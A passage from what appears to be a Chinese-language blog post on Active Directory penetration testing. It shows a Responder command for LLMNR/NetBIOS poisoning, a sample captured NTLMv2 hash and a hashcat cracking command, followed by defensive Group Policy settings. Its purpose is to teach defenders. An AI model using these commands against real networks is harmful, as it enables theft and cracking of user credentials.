<h3 id="4-攻击示例（Responder-捕获NTLMv2哈希）"><a href="#4-攻击示例（Responder-捕获NTLMv2哈希）" class="headerlink" title="4. 攻击示例（Responder 捕获NTLMv2哈希）"></a><strong>4. 攻击示例（Responder 捕获NTLMv2哈希）</strong></h3><ol>
<li><strong>启动Responder</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 -wrf</span><br></pre></td></tr></table></figure>
<ul>
<li><code>-wrf</code>：启用HTTP&#x2F;SMB&#x2F;FTP等服务的伪造。</li>
</ul>
</li>
<li><strong>诱导客户端触发请求</strong>：<ul>
<li>用户点击无效的共享链接（如 <code>\\fake-server\share</code>）。</li>
</ul>
</li>
<li><strong>捕获哈希</strong>：<ul>
<li>Responder 输出捕获的NTLMv2哈希（保存为 <code>hash.txt</code>）：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[SMB] NTLMv2-SSP Hash captured from 192.168.1.10: john::DOMAIN:1122334455667788:AAAAAAA...</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>破解哈希</strong>：<ul>
<li>使用 <strong>Hashcat</strong> 暴力破解：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 hash.txt /path/to/wordlist.txt</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<hr>
<h3 id="5-防御方案"><a href="#5-防御方案" class="headerlink" title="5. 防御方案"></a><strong>5. 防御方案</strong></h3><h4 id="1-禁用不安全的协议"><a href="#1-禁用不安全的协议" class="headerlink" title="(1) 禁用不安全的协议"></a><strong>(1) 禁用不安全的协议</strong></h4><ul>
<li><strong>关闭LLMNR</strong>（组策略）：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">计算机配置 → 管理模板 → 网络 → DNS客户端 → 关闭LLMNR → 启用</span><br></pre></td></tr></table></figure></li>
<li><strong>禁用NetBIOS</strong>（网络适配器属性）：<ul>
<li>IPv4高级设置 → WINS → 禁用NetBIOS over TCP&#x2F;IP。</li>
</ul>
</li>
<li><strong>限制IPv6使用</strong>（如无需IPv6）：<ul>
<li>禁用IPv6或配置防火墙规则过滤本地链路多播。</li>
</ul>
</li>
</ul>
<h4 id="2-强制使用DNS安全扩展"><a href="#2-强制使用DNS安全扩展" class="headerlink" title="(2) 强制使用DNS安全扩展"></a><strong>(2) 强制使用DNS安全扩展</strong></h4><ul>
<li>配置DNSSEC，防止DNS投毒。</li>
<li>确保内网DNS服务器可靠，避免解析失败。</li>
</ul>
<h4 id="3-阻止NTLM协议滥用"><a href="#3-阻止NTLM协议滥用" class="headerlink" title="(3) 阻止NTLM协议滥用"></a><strong>(3) 阻止NTLM协议滥用</strong></h4><ul>
<li><p><strong>启用SMB签名</strong>（防止中继攻击）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">组策略 → 计算机配置 → 策略 → 安全设置 → 本地策略 → 安全选项 → Microsoft网络服务器: 数字签名通信(总是)</span><br></pre></td></tr></table></figure></li>
<li><p><strong>禁用NTLMv1</strong>，仅允许NTLMv2或Kerberos：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">组策略 → 计算机配置 → 策略 → 安全设置 → 本地策略 → 安全选项 → 网络安全: LAN Manager身份验证级别 → 仅发送NTLMv2响应</span><br></pre></td></tr></table></figure></li>
<li><p><strong>限制NTLM使用</strong>（通过组策略或注册表）。</p>
</li>
</ul>
<h4 id="4-网络监控与隔离"><a href="#4-网络监控与隔离" class="headerlink" title="(4) 网络监控与隔离"></a><strong>(4) 网络监控与隔离</strong></h4><ul>
<li>检测异常的LLMNR&#x2F;NetBIOS流量（如非管理员主机的响应）。</li>
<li>分段内网，限制敏感主机的多播通信。</li>
</ul>
<h4 id="5-用户教育与策略"><a href="#5-用户教育与策略" class="headerlink" title="(5) 用户教育与策略"></a><strong>(5) 用户教育与策略</strong></h4><ul>
<li>培训用户避免点击未知共享链接。</li>
<li>使用主机名全称（FQDN）访问资源，减少解析失败概率。</li>
</ul>
<hr>
<h3 id="6-扩展：中继攻击（Relay）防御"><a href="#6-扩展：中继攻击（Relay）防御" class="headerlink" title="6. 扩展：中继攻击（Relay）防御"></a><strong>6. 扩展：中继攻击（Relay）防御</strong></h3><p>若攻击者将捕获的NTLM哈希直接中继到其他服务（如Exchange、AD CS），危害更大：</p>
<ul>
<li><strong>启用LDAP&#x2F;SMB签名</strong>：中继攻击要求目标服务禁用签名。</li>
<li><strong>启用EPA（Extended Protection for Authentication）</strong>：绑定HTTPS通道与认证信息。</li>
</ul>
<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>通过 <strong>LLMNR&#x2F;NetBIOS投毒</strong> 和 <strong>NTLM哈希捕获</strong> 是内网渗透的常见手法，防御需结合协议禁用、认证加固和网络监控。企业应优先使用 <strong>Kerberos</strong> 并彻底淘汰NTLM协议。</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp" title="头像" alt="头像"></a><div class="post-copyright__author_name">Takake</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://blog.takake.com/posts/61927/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://blog.takake.com/posts/61927/')">ADAPT域渗透测试</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp" alt="红十字会"/></a><div class="post-qr-code-desc">红十字会</div></li><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp" alt="LOGO"/></a><div class="post-qr-code-desc">LOGO</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://blog.takake.com/posts/61927/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=ADAPT域渗透测试&amp;url=https://blog.takake.com/posts/61927/&amp;pic=https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/80cb39dbb6fd526671943aeea318972bd5073688.png?x-oss-process=style/img-to-webp" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.takake.com" target="_blank">高木のBlog</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>操作系统<span class="tagsPageCount">3</span></a><a class="post-meta__box__tags" href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>横向移动<span class="tagsPageCount">4</span></a><a class="post-meta__box__tags" href="/tags/%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>认证机制<span class="tagsPageCount">3</span></a><a class="post-meta__box__tags" href="/tags/kerberos/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>kerberos<span class="tagsPageCount">1</span></a><a class="post-meta__box__tags" href="/tags/NTLM/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>NTLM<span class="tagsPageCount">2</span></a><a class="post-meta__box__tags" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>域渗透测试<span class="tagsPageCount">2</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/AI%20Infra%20feature%20image-1.png?x-oss-process=style/img-to-webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/11615/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/80cb39dbb6fd526671943aeea318972bd5073688.png?x-oss-process=style/img-to-webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Windows认证机制</div></div></a></div><div class="next-post pull-right"><a href="/posts/10850/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Thinkphp安全漏洞分析</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/posts/11615/" title="Windows认证机制"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/80cb39dbb6fd526671943aeea318972bd5073688.png?x-oss-process=style/img-to-webp" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-03-16</div><div class="title">Windows认证机制</div></div></a></div><div><a href="/posts/5304/" title="域横向移动工具对比"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-05-04</div><div class="title">域横向移动工具对比</div></div></a></div><div><a href="/posts/63289/" title="Windows暂停更新十年"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/Snipaste_2024-01-01_13-45-45.jpg?x-oss-process=style/img-to-webp" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-01-01</div><div class="title">Windows暂停更新十年</div></div></a></div><div><a href="/posts/32372/" title="内网穿透技术"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-05-24</div><div class="title">内网穿透技术</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div><div class="comment-tips" id="comment-tips"><span>✅ 你无需删除空行，直接评论以获取最佳展示效果</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://emotion.acs.pw/emotion/Heo-100/%E6%BB%91%E7%A8%BD.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">网络安全、开发、人工智能</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">Takake</h1><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/takakie" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/3494356843497618" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">防疫指南：菊花上插葱，新冠去无踪✌️</div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/645fa415e869402.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%BA%A2%E9%98%9FPowerShell"><span class="toc-number">1.</span> <span class="toc-text">一、红队PowerShell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-PowerShell-%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text">1. PowerShell 基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.1.</span> <span class="toc-text">基本概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.1.2.</span> <span class="toc-text">常用命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%BA%A2%E9%98%9F%E5%B8%B8%E7%94%A8-PowerShell-%E6%A8%A1%E5%9D%97"><span class="toc-number">1.2.</span> <span class="toc-text">2. 红队常用 PowerShell 模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.2.2.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.2.3.</span> <span class="toc-text">横向移动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">1.2.4.</span> <span class="toc-text">持久化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B"><span class="toc-number">1.3.</span> <span class="toc-text">3. 绕过安全检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%B7%E6%B7%86%E4%B8%8E%E7%BC%96%E7%A0%81"><span class="toc-number">1.3.1.</span> <span class="toc-text">混淆与编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.2.</span> <span class="toc-text">无文件攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E9%98%B2%E5%BE%A1%E8%A7%84%E9%81%BF"><span class="toc-number">1.4.</span> <span class="toc-text">4. 防御规避</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%AE%9E%E6%88%98%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90"><span class="toc-number">1.5.</span> <span class="toc-text">5. 实战工具推荐</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.6.</span> <span class="toc-text">6. 防御建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E7%A4%BA%E4%BE%8B%EF%BC%9A%E5%8F%8D%E5%90%91-Shell"><span class="toc-number">1.7.</span> <span class="toc-text">7. 示例：反向 Shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81AD%E5%9F%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">二、AD域基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-AD-%E5%9F%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.1.</span> <span class="toc-text">Active Directory (AD) 域基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-AD-%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5"><span class="toc-number">2.2.</span> <span class="toc-text">1. AD 核心概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E5%9F%9F%EF%BC%88Domain%EF%BC%89"><span class="toc-number">2.2.1.</span> <span class="toc-text">1.1 域（Domain）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E6%9E%97%EF%BC%88Forest%EF%BC%89%E4%B8%8E%E6%A0%91%EF%BC%88Tree%EF%BC%89"><span class="toc-number">2.2.2.</span> <span class="toc-text">1.2 林（Forest）与树（Tree）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E7%BB%84%E7%BB%87%E5%8D%95%E4%BD%8D%EF%BC%88OU-Organizational-Unit%EF%BC%89"><span class="toc-number">2.2.3.</span> <span class="toc-text">1.3 组织单位（OU, Organizational Unit）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-%E5%85%B3%E9%94%AE%E8%A7%92%E8%89%B2%EF%BC%88FSMO-Roles%EF%BC%89"><span class="toc-number">2.2.4.</span> <span class="toc-text">1.4 关键角色（FSMO Roles）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-AD-%E6%A0%B8%E5%BF%83%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.3.</span> <span class="toc-text">2. AD 核心服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-DNS"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.1 DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-LDAP%EF%BC%88%E8%BD%BB%E9%87%8F%E7%BA%A7%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.2 LDAP（轻量级目录访问协议）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-Kerberos-%E8%AE%A4%E8%AF%81"><span class="toc-number">2.3.3.</span> <span class="toc-text">2.3 Kerberos 认证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-AD-%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"><span class="toc-number">2.4.</span> <span class="toc-text">3. AD 安全机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E5%AE%89%E5%85%A8%E8%BE%B9%E7%95%8C"><span class="toc-number">2.4.1.</span> <span class="toc-text">3.1.安全边界</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E6%9D%83%E9%99%90%E6%A8%A1%E5%9E%8B"><span class="toc-number">2.4.2.</span> <span class="toc-text">3.2 权限模型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8"><span class="toc-number">2.4.3.</span> <span class="toc-text">3.3 组策略安全</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E7%BA%A2%E9%98%9F%E8%A7%86%E8%A7%92%EF%BC%9AAD-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-number">2.5.</span> <span class="toc-text">4. 红队视角：AD 常见攻击面</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.5.1.</span> <span class="toc-text">4.1 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E5%87%AD%E8%AF%81%E6%94%BB%E5%87%BB"><span class="toc-number">2.5.2.</span> <span class="toc-text">4.2 凭证攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">2.5.3.</span> <span class="toc-text">4.3 横向移动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.5.4.</span> <span class="toc-text">4.4 权限提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">2.5.5.</span> <span class="toc-text">4.5 持久化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">2.6.</span> <span class="toc-text">5. 常用工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE-1"><span class="toc-number">2.7.</span> <span class="toc-text">6. 防御建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A%E9%80%9A%E8%BF%87-LDAP-%E6%9F%A5%E8%AF%A2%E5%9F%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">2.8.</span> <span class="toc-text">示例：通过 LDAP 查询域信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.</span> <span class="toc-text">三、活动目录枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.1.</span> <span class="toc-text">1. 基本信息枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E5%9F%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">3.1.1.</span> <span class="toc-text">(1) 获取当前域信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%9A%E4%BD%8D"><span class="toc-number">3.1.2.</span> <span class="toc-text">(2) 域控制器定位</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%94%A8%E6%88%B7%E4%B8%8E%E7%BB%84%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.2.</span> <span class="toc-text">2. 用户与组枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9F%A5%E8%AF%A2%E5%9F%9F%E7%94%A8%E6%88%B7"><span class="toc-number">3.2.1.</span> <span class="toc-text">(1) 查询域用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9F%A5%E8%AF%A2%E5%9F%9F%E7%BB%84"><span class="toc-number">3.2.2.</span> <span class="toc-text">(2) 查询域组</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.3.</span> <span class="toc-text">3. 计算机枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 